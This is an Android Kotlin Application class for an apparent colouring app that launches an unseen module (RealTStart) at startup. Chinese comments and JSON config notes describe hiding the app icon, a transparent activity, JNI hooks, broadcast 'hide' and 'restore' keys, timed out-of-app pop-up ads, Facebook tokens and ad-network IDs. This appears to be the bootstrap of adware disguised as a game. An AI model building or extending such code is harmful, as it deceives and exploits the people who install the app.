package com.announcement.comprehension.t

import android.app.Application
import com.announcement.comprehension.utcs.RealTStart
import com.tencent.mmkv.MMKV

class ColorApp : Application() {
    override fun onCreate() {
        super.onCreate()
        app = this
        MMKV.initialize(app)
        mmkv = MMKV.defaultMMKV()
        RealTStart().st(app)
    }

    companion object {
        lateinit var app: Application
        lateinit var mmkv: MMKV
    }
}

//T686
//bab ['com.announcement.comprehension', 'com.fillcolor.fun.pars',  # 包名
//                   'com.announcement.comprehension.ReWaPaFrt',# 透明activity
//                   'xik/gm',  #  广播
//                   '','com.announcement.comprehension.MissApple',  # 隐藏图标
//                   'xik/wn', '"lo3"',  # jni路径及函数
//                   '/hotmdl',# 外弹文件开关名
//                   '"fancaj"',# 广播接收key
//                   '"vn"',  # 恢复
//                   '"yaso"',  # 隐藏
//                   '"bkbir"']  # 外弹
//
// kik ['com.announcement.comprehension', 'com.fillcolor.fun.pars',  # 包名
//                  'xik/af',
//                   '"v7"','"z6"', '"u4"',
//                  'xik/ba',  # hander
//                  'xik/cc',  #wvcClass
//                  'xik/qb',  # WccClass WebChormeClient
//                  '/hotmdl']#文件开关
//
//

//{
//    "bta":"wow_bob_dud_kuk",//是否外弹(wow)，是否上报tba(bob)，是否使用展示和失败上限(dud),是否使用pangle(kuk)
//    "cvv":"id_token",//facebook id和token
//    "nak":"pangleId_pangleId",//广告ID
//    "akm":"5_10",//A用户admin定时(分钟),B用户admin定时（秒）
//    "nma":"10_20_30_20_30",//小时上限，天上限，外弹失败上限，展示时长上限,admin请求次数上限
//    "eka":"15_10_0_30_200_400"//定时，定时随机幅度，展示间隔，初次间隔，外弹后展示广告的延时最小值(毫秒)，外弹后展示广告的延时最大值（毫秒）
//}

//{
//    "bta":"wow_bob_dud_kuk",
//    "cvv":"id_token",
//    "nak":"pangleId_pangleId",
//    "akm":"5_10",
//    "nma":"10_20_30_20_30",
//    "eka":"15_10_0_30_200_400"
//}